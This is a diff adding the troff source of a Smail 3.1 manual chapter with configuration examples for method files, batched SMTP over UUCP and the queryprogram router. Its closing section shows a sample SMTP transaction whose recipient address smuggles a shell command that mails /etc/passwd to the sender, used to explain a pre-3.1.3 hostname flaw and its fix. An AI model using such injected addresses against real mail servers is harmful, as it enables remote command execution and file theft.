@@ -1,0 +1,415 @@
+.\" @(#) cookbook,v 1.3 1991/11/15 16:35:16 tron Exp
+.NH
+Examples of Smail Run-time Configurations
+.PP
+The following sections give examples of run-time configurations that
+can be used to extend smail in a variety of useful ways.  In general
+the examples do not contain complete configuration files and, as such,
+they should be merged in to existing configuration files where
+appropriate.  When merging in new configuration file entries, keep in
+mind that order is important in the director and router files.
+.PP
+Many of the examples shown here, along with other useful examples, can
+be found under the
+.B Smail3.1
+source directory
+.I samples .
+.NH 2
+Using Method Files
+.PP
+At the present time,
+.B method
+files (described in
+.I smail (5))
+can only be used in run-time configuration files.  Method files can be
+used to define the transport to be used on a per-host basis.  An
+example of a method file is:
+.DS I
+.ta 10n 30n
+# select the transport on a per-host basis
+.sp \n(PDu
+# UUCP hosts to which mail should be delivered immediately:
+sun	demand	# our internet gateway
+muts12	demand	# internal machine, dedicated link
+.sp \n(PDu
+# Hosts to which mail should be delivered immediately with
+# a non-interactive SMTP protocol over UUCP:
+busboy	demand_uusmtp	# gateway to sun network
+.sp \n(PDu
+# Hosts to which mail should be queued with a non-interactive
+# SMTP protocol over UUCP:
+namei	uusmtp	# experimental Smail3.1 node
+.sp \n(PDu
+# For other hosts, use normal (queued) uucp mail:
+*	uux	# all other hosts
+.TA
+.DE
+Many of the standard preloaded router entries could be modified to use
+this method file to select a transport, rather than allowing only one
+transport per router.  To make this change, copy the router file
+corresponding to the pre-loaded configuration, found in the Smail
+source file
+.I samples/generic/routers ,
+to the smail LIB_DIR directory, normally
+.I /usr/lib/smail .
+Remove the generic attribute
+.B transport
+and add a generic attribute
+.B method
+which points to the uucp methods file.  As an example, let's change
+the
+.B paths
+router, described in the section
+.I "The Preloaded Router Configuration" ,
+and modify it to use the method file above.  After removing the
+.B transport
+attribute and adding the
+.B method
+attribute, the router file entry becomes:
+.DS I
+# paths - route using a paths file, like that produced by the
+# pathalias program
+paths:	driver = pathalias,	# general-use paths router
+	method = uucp;		# use "uucp" method file
+.sp \n(PDu
+	file = paths,		# sorted file containing path info
+	proto = bsearch,	# use a binary search
+	optional,		# ignore if the file does not exist
+	domain = uucp		# strip ending ".uucp" before searching
+.DE
+Assuming that the values for the
+.I config
+file variables
+.B method_dir
+and
+.B smail_lib_dir
+are ``methods'' and ``/usr/lib/smail'' respectively, the above example
+will use a method file stored in the file
+.I /usr/lib/smail/methods/uucp .
+.PP
+Method files become extremely useful when extending smail to handle
+new situations.
+.NH 2
+Using Batched SMTP Effectively
+.PP
+The transports
+.B uusmtp
+and
+.B demand_uusmtp
+will allow you to gain the versatility of the SMTP format, such as
+support for arbitrary addresses, including addresses containing quoted
+characters or white space, and support for a large or unlimited number
+of recipient addresses per transaction.  These capabilities are gained
+by putting an envelope of commands around the mail message and
+shipping the commands and the message in one file.  As an example, a
+mail message to be delivered to ``cathy@foobar.uucp'' might be sent
+as:
+.DS I
+HELO busboy.uts.amdahl.com
+MAIL FROM: <@busboy.uts.amdahl.com:tron@futatsu.uts.amdahl.com>
+RCPT TO: <cathy@foobar.uucp>
+DATA
+Received: by busboy.uts.amdahl.com id m0d98az-000gtZC;
+	Mon Jun 27 18:45 PDT 1988
+Received: by futatsu.uts.amdahl.com id m0d98ax-0jaZiiC;
+	Mon Jun 27 18:43 PDT 1988
+From: tron@futatsu.uts.amdahl.com (Ronald S. Karr)
+To: cathy@foobar.uucp
+Subject: Hmmm.  It's Email!
+.sp \n(PDu
+.fi
+This is a test of the Emergency Email System.  It is only a test.  For
+this and the next several lines we will be conducting a test of the
+networks between my machine and your machine.  This test is being held
+without the specific knowledge of the network organizers on these
+networks, though with their cooperation.  If this had not been a test,
+you would have been informed of a restaurant at which you should show
+up immediately to partake of foodstuffs in the company of at least one
+other person.
+.nf
+\&.
+QUIT
+.DE
+The line beginning with ``HELO'' identifies the sending host, and the
+line beginning with ``MAIL FROM:'' identifies a return-path to the
+sender of the mail message.  Any number of recipients may be specified
+by giving multiple lines beginning with ``RCPT TO:''.  The ``DATA''
+command signals that the actual message follows.  The message
+continues until a line containing only a signal dot character.
+Finally the command ``QUIT'' signals the end of the complete
+transaction.
+.NH 3
+Batching Multiple Messages in One SMTP Transaction
+.PP
+The SMTP format allows multiple messages to be specified in one
+transaction by repeating everything between the ``HELO'' and the
+``QUIT'' commands (not including those commands themselves) to
+specify the envelope and contents of more messages.
+.PP
+By gathering multiple messages into one SMTP transaction, transport of
+mail over UUCP can be made more efficient.  This reduces overhead
+in the UUCP protocol as well as the number of mailer invocations
+required for mail delivery on the remote side.  Unfortunately,
+.B Smail3.1
+processes only one message at a time, so it cannot, by itself, create
+these multiple-message transaction files.
+.PP
+However, smail can accumulate messages into a file or into a directory,
+using the
+.B appendfile
+transport driver.  This allows a shell script or C program outside of
+smail to create batch jobs to be sent to the uux program.  For ease of
+description, we will do this as a shell script.
+.PP
+It is somewhat difficult in a shell script to perform the file locking
+primatives required to support the accumulation of messages into one
+file, so we will accumulate messages into a directory, one file per
+message, and concatenate these files together at intervals.
+.PP
+First, we need to write a transport file entry that can handle our
+needs.  It should write files into a directory whose name is based
+upon the name of the remote host to which mail should be delivered.
+These files should contain an SMTP command envelope containing all
+commands necessary for delivery except for the HELO and QUIT commands.
+The following transport file entry will accomplish this:
+.DS I
+# accumulate messages into a directory on a per-host basis
+batch_smtp:
+	# the appendfile driver can also accumulate in directories
+	driver=appendfile,
+	hbsmtp;		# half-baked BSMTP, no HELO or QUIT
+.sp \n(PDu
+	# files whose names begin with `q' will be placed here:
+	dir=/usr/spool/smail/outq/${lc:host},
+	user=cronjobs,	# files will be owned by this user
+	mode=0600,	# and unreadable by other users
+.DE
+.PP
+When writing files into a directory, the
+.B appendfile
+driver first writes the file to a temporary file, with a name
+beginning with ``temp.'' and then renames the file to a name beginning
+with the letter `q'.  Thus, a shell script can assume that any file
+whose name begins with the letter `q' is in a consistent state.  The
+shell script to perform the actual delivery, called
+.I batchsmtp ,
+is then:
+.DS I
+#!/bin/sh
+# deliver messages accumulated into subdirectories of the
+# outq spool directory.  Subdirectory names are based on
+# the actual hostnames involved:
+.sp \n(PDu
+OUTQ=/usr/spool/smail/outq
+UUX=/usr/bin/uux
+LOCALHOST=busboy.uts.amdahl.com
+.sp \n(PDu
+cd $OUTQ
+# loop through all of the subdirectories
+for i in *; do (
+	cd $i
+	list=q*		# get the list of message files
+	if [ "$list" = "*" ]; then
+		# no messages were found
+		exit 0	# leave sub-shell
+	fi
+	# send all of the files, adding HELO and QUIT commands
+	(echo "HELO $LOCALHOST"
+	 cat $list
+	 echo QUIT) | $UUX - $i!rsmtp
+	rm $list
+); done
+.sp \n(PDu
+exit 0
+.DE
+The script above should be run from cron periodically, by either of
+the users
+.I cronjob
+or
+.I root .
+The execution interval should be long enough that there will not be
+any chance that two instances of this script will run concurrently.
+Alternately, the script could be changed to loop indefinitely,
+performing the above operations and then sleeping for some amount of
+time, say half an hour.  This would eliminate any potential problems
+with accidental concurrency.
+.PP
+It is also possible to send the files over in a compressed format.
+This can substantially reduce the telephone costs incurred in the
+transmission of data over modems, in exchange for greater usage of CPU
+time on both sides.  Compression can be done by creating a shell
+script on the remote end, called
+.I rcsmtp
+(for
+.I "Read Compressed SMTP" ),
+which contains the following:
+.DS I
+#!/bin/sh
+# Receive compressed batches of SMTP commands and send them
+# to smail.
+.sp \n(PDu
+# the following line should be changed to reflect the
+# organization of your system.
+/usr/local/bin/compress -d | /bin/rsmtp
+exit 0
+.DE
+Then, the
+.I batchsmtp
+shell script should be modified, to form the shell script
+.I cbsmtp ,
+so that the pipeline invoking the uux command is:
+.DS I
+	# compress all of the files, adding HELO and QUIT commands
+	(echo "HELO $LOCALHOST"
+	 cat $list
+	 echo QUIT) | $COMPRESS | $UUX - $i!rsmtp
+.DE
+where the shell variable COMPRESS should be the path to the compress
+program on your system.  If your site does not have compress, it
+can be obtained from a number of sources, including the archives on
+the host
+.B uunet.uu.net .
+.NH 2
+Using the Queryprogram Router Driver
+.PP
+The
+.B queryprogram
+router driver is handy for performing routing operations for which
+none of the other available drivers are suitable.  This calls upon an
+external program to perform routing operations.
+.PP
+Because the
+.B queryprogram
+driver performs a fork/exec operation for each new hostname, it should
+be used only for prototyping wherever possible.  Writing a new driver
+which handles your needs is much more efficient.  However, if you have
+a low amount of mail traffic, or if you have a dedicated machine and
+do not mind the overhead, then this driver may be reasonable.  To help
+out somewhat, the driver does cache responses so that a list of
+routing requests to the same host will result in only one fork/exec.
+.PP
+A simple case of the use of the
+.B queryprogram
+driver comes from a need expressed by one of the administrators
+participating in the smail alpha testing program.  His site has a
+very large number of UUCP neighbors, and the overhead of using
+.B uuname
+to obtain the contents of the entire
+.I Systems
+file was simply too great.  He wrote a command
+.B uuinfo
+to query a DBM database formed from their
+.I Systems
+file.  If this command is invoked with the flag
+.B \-q
+and a sitename, then it will return an exit status of 0 if the site is
+a neighbor and 1 otherwise.  A simple router to use this program is:
+.DS I
+.ta .5i 3i
+# use uuinfo to match neighboring hosts:
+use_query:
+	driver = queryprogram,		# query a program for route info
+	transport = uux;		# use this as a default
+.sp \n(PDu
+	cmd = "/usr/local/bin/uuinfo -q ${lc:host}",
+	domain = uucp
+.TA
+.DE
+.PP
+In this case, only the status of neighbor versus non-neighbor is
+obtained.  It is also possible to call a program that returns a path
+and a transport.  A simple case, which would be handled more
+efficiently with a paths database and a method file uses the following
+shell script,
+.I query.sh ,
+to perform routing:
+.DS I
+#!/bin/sh
+# The hostname is passed as the first argument, write a path and
+# transport for each host that we match.  Alternately, no transport is
+# output if the default is sufficient.
+case "$1" in
+.sp \n(PDu
+\e[*)	# look for internet addresses in square brackets
+	inet=`echo "$1" | sed -n 's/^\e[\e([0-9.]*\e)\e]$/[\e1]/p'`
+	if [ "$inet" ]; then
+		echo $inet smtp
+	else
+		exit 1
+	fi;;
+foo)	echo foo uusmtp;;
+bar)	echo foo!bar uusmtp;;
+curds)	echo curds;;
+whey)	echo curds!whey;;
+*)	echo foo!$1 uusmtp;; # send mail for unknown hosts to foo
+.sp \n(PDu
+esac
+.sp \n(PDu
+exit 0
+.DE
+This shell script outputs a path, with hostnames separated by the
+character `!', and may also write out a transport, separated from the
+path by space and tab characters.  It can match literal internet
+addresses, stored in square brackets, and forwards mail for unknown
+hosts to the host ``foo''.  A router file entry which can make use of
+this shell script is:
+.DS I
+# use query.sh to match hosts
+use_query:
+	driver = queryprogram,		# query a program for route info
+	transport = uux;		# use this as a default
+.sp \n(PDu
+	cmd = "/bin/sh $smail_lib_dir/query.sh ${lc:host}",
+	domain = uucp, read_transport, read_path
+.DE
+This entry assumes that the
+.I query.sh
+script is stored under the same directory as smail utilities and
+run-time configuration files, normally
+.I /usr/lib/smail .
+The shell script is executed as an unprivileged user.
+.PP
+The above example can be used to point out something very important:
+security is difficult to maintain in an environment where shell
+scripts are executed as a result of requests from remote machines.  As
+it currently stands, the example above can be used by a remote site to
+execute an arbitrary shell command on the local host, for sites
+running versions of Smail previous to
+.B Smail3.1.3 .
+To do this, a remote user could send the following batched SMTP
+transaction:
+.DS I
+HELO foo@bar
+MAIL FROM:<foo@bar>
+RPCT TO:<dummy pipe!"`cat /etc/passwd | mail $SENDER`">
+DATA
+Send me the passwd file.
+\&.
+QUIT
+.DE
+The problem here is that versions of smail previous to
+.B Smail3.1.3
+allow whitespaces in hostnames.  Thus, for the recipient address
+above, the
+.I query.sh
+shell script would have been invoked with a host of ``dummy pipe''
+which would have caused the shell script to return the line:
+.DS I
+foo!dummy pipe uusmtp
+.DE
+which would then have caused the
+.B pipe
+transport to be invoked to run the shell command:
+.DS I
+dummy!"`cat /etc/passwd | mail $SENDER`"
+.DE
+The command in backquotes here would then cause your passwd file to be
+returned to the ``foo@bar''.  The version of this script in the
+samples directory takes care of this problem by explicitly checking for
+whitespace in the hostname.  Versions of Smail starting with
+Smail3.1.3 explicitly allow only alphanumeric characters, and a small
+set of special characters (dot (`.'), dash (`-'), underscore (`_'),
+plus (`+') and equal (`=')), in hostnames.  In addition, hostnames are
+prohibited from beginning with a dash character.  It should be noted
+that any characters are still allowed if the hostname begins with a
+left bracket.
